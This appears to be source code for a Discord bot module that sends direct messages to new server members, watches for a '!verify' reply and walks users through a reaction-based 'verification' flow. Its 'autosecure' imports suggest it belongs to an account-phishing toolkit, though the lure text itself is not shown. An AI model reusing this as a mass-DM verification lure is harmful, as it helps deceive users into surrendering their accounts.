const getEmbed = require("../../../autosecure/utils/responses/getEmbed");
const getButton = require("../../../autosecure/utils/responses/getButton");
const { ActionRowBuilder, Events } = require("discord.js");
const dmMap = new Map();

class DMMonitor {
  constructor() {
    this.lastChecked = new Map();
    this.dmedUsers = new Map();
    this.startedDates = new Map();
    this.verificationStates = new Map();
    this.interval = null;
    this.verifymsg = "!verify";
  }

  async start(client) {
    return;
    console.log(`Started DM monitoring mode!`);
    if (this.interval) return;

    for (const [key, config] of dmMap.entries()) {
      this.startedDates.set(key, Date.now());

      const channel = await client.channels.fetch(config.channelId);
      if (channel) {
        client.on(Events.GuildMemberAdd, async (member) => {
          if (member.guild.id === channel.guild.id) {
            await this.handleNewMember(member, config);
          }
        });
      }
    }

    this.interval = setInterval(async () => {
      try {
        for (const [key, config] of dmMap.entries()) {
          const client = config.client;
          const users = Array.from(client.users.cache.values());

          for (const user of users) {
            if (user.bot) continue;

            try {
              const dmChannel = await user.createDM();
              if (!dmChannel) continue;

              const lastCheckedId = this.lastChecked.get(`${key}|${user.id}`) || '0';
              const startedDate = this.startedDates.get(key);

              const messages = await dmChannel.messages.fetch({ limit: 50 });

              const newMessages = messages.filter(msg =>
                msg.author.id === user.id &&
                msg.content === this.verifymsg &&
                (!lastCheckedId || msg.id > lastCheckedId) &&
                msg.createdTimestamp >= startedDate
              );

              if (newMessages.size > 0) {
                await this.handleVerificationStart(user, client, dmChannel);

                const newestMessage = Array.from(newMessages.values()).reduce((a, b) =>
                  a.createdTimestamp > b.createdTimestamp ? a : b
                );
                this.lastChecked.set(`${key}|${user.id}`, newestMessage.id);
              }
            } catch (dmError) {
              console.error(`Error processing DMs for user ${user.username}:`, dmError);
            }
          }
        }
      } catch (error) {
        console.error('DMMonitor error:', error);
      }
    }, 5000);
  }

  async handleNewMember(member, config) {
    try {
      const user = member.user;
      const dmChannel = await user.createDM();
      if (!dmChannel) return;

      const now = Date.now();
      const lastDmed = this.dmedUsers.get(user.id) || 0;

      if (now - lastDmed >= 10800000) {
        await dmChannel.send({ embeds: [await getEmbed(config.client, "dm1")] });
        this.dmedUsers.set(user.id, now);

        setTimeout(() => {
          this.dmedUsers.delete(user.id);
        }, 10800000);
      }
    } catch (error) {
      console.error(`Error handling new member ${member.id}:`, error);
    }
  }

  async handleVerificationStart(user, client, dmChannel) {
    const now = Date.now();
    const lastDmed = this.dmedUsers.get(user.id) || 0;

    if (now - lastDmed >= 10800000) {
      const dm2Embed = await getEmbed(client, "dm2");
      const message = await dmChannel.send({ 
        embeds: [dm2Embed],
        content: "React with 🅰️ or 🅱️ to choose an option" 
      });

      await message.react('🅰️');
      await message.react('🅱️');

      this.verificationStates.set(user.id, {
        messageId: message.id,
        timestamp: now,
        channel: dmChannel
      });

      setTimeout(async () => {
        if (this.verificationStates.has(user.id)) {
          const state = this.verificationStates.get(user.id);
          if (state && !state.completed) {
            this.verificationStates.delete(user.id);
            await dmChannel.send({ embeds: [await getEmbed(client, "dm1")] });
          }
        }
      }, 60000);

      this.dmedUsers.set(user.id, now);
      setTimeout(() => {
        this.dmedUsers.delete(user.id);
      }, 10800000);
    }
  }

  async setupReactionCollector(client) {
    client.on('messageReactionAdd', async (reaction, user) => {
      if (user.bot) return;

      const state = this.verificationStates.get(user.id);
      if (state && state.messageId === reaction.message.id) {
        if (reaction.emoji.name === '🅰️' || reaction.emoji.name === '🅱️') {
          state.completed = true;
          this.verificationStates.set(user.id, state);

          await state.channel.send({ 
            embeds: [await getEmbed(client, "dm3")] 
          });

          this.verificationStates.delete(user.id);
        }
      }
    });
  }

  stop() {
    if (this.interval) {
      clearInterval(this.interval);
      this.interval = null;
      console.log('DM monitoring stopped');
    }
  }
}

async function addConfig(userId, channelId, client) {
  dmMap.set(userId, { channelId, client });
}

module.exports = { DMMonitor, dmMap, addConfig };
